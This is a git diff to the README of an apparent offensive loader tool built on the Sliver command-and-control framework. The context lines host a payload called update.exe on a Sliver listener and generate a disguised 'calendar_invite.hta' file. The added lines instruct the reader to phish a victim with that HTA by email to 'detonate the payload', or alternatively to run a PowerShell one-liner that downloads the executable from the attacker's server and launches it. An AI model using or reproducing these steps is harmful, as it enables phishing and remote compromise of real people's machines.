@@ -75,6 +75,11 @@ cd /opt/Sliver_Loader
 sliver > websites add-content --website mysite --web-path /download/update.exe --content /opt/Sliver_Loader/ACTUAL_FILENAME.exe --content-type application/octet-stream
 sliver > http --website mysite --lhost your-server --lport 80
 ./hta_generator.py -m 1 -H YOUR_IP/download/ -f update.exe -o calendar_invite.hta
+
+Victim Machine
+Phish victim with .HTA via email to detonate the payload
+OR
+PS > (New-Object System.Net.WebClient).DownloadFile('http://your-server/download/update.exe', "$env:TEMP\update.exe"); Start-Process "$env:TEMP\update.exe"
 ```
 
 **Generate All Methods:**
